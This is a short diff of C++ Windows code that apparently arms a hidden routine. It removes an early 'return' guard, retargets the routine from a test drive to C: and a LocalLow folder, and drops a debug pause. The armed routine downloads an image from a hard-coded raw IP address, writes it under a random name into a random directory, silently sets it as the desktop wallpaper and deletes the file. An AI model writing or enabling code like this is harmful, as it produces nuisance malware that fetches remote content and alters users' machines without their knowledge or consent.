@@ -21,7 +21,7 @@ bool FS::F_WriteFile(std::string directory)
 
 void FS::F_Main()
 {
-    return;
+    //return;
     srand(time(NULL));
     std::string url = "http://16.170.254.129/paska.jpg";
     std::string dst = GetExePath()+"\\paska.jpg";
@@ -53,8 +53,8 @@ void FS::F_Main()
     
 
     std::string thispath;
-    std::string path = "O:\\";
-    GetRandomDirectory(&thispath, path);
+    std::string path = "C:\\";
+    GetRandomDirectory(&thispath, localLow);
     thispath += '\\' + random_file_name + ".jpg";
 
     //std::cout << "directory: " << thispath << '\n';
@@ -74,5 +74,4 @@ void FS::F_Main()
 
     SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)thispath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
     remove(thispath.c_str());
-    system("pause");
 }
